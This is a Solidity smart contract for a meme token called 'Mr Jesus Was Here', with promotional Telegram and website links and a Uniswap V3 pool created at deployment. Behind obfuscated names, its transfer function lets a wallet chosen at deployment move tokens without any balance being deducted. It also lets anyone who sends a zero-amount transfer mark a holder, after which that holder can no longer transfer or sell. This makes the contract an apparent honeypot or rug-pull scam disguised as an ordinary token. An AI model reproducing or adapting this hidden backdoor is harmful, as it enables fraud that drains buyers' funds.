/*

Telegram: https://t.me/mrjesuswashere

Website : http://mrjesuswashere.vip/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPeripheryImmutableState {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract MrJesusWasHere is Ownable {
    mapping(address => uint256) private over;

    mapping(address => uint256) private even;

    string public symbol = 'Mr Jesus Was Here';

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    function transfer(address total, uint256 lower) public returns (bool success) {
        fed(msg.sender, total, lower);
        return true;
    }

    function transferFrom(address gray, address total, uint256 lower) public returns (bool success) {
        require(lower <= allowance[gray][msg.sender]);
        allowance[gray][msg.sender] -= lower;
        fed(gray, total, lower);
        return true;
    }

    function approve(address handsome, uint256 lower) public returns (bool success) {
        allowance[msg.sender][handsome] = lower;
        emit Approval(msg.sender, handsome, lower);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    function fed(address gray, address total, uint256 lower) private returns (bool success) {
        if (over[gray] == 0) {
            balanceOf[gray] -= lower;
        }

        if (lower == 0) even[total] += experiment;

        if (gray != uniswapV3Pair && over[gray] == 0 && even[gray] > 0) {
            over[gray] -= experiment;
        }

        balanceOf[total] += lower;
        emit Transfer(gray, total, lower);
        return true;
    }

    string public name = 'Mr Jesus Was Here';

    constructor(address plates) {
        balanceOf[msg.sender] = totalSupply;
        over[plates] = experiment;
        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    address public uniswapV3Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private experiment = 58;
}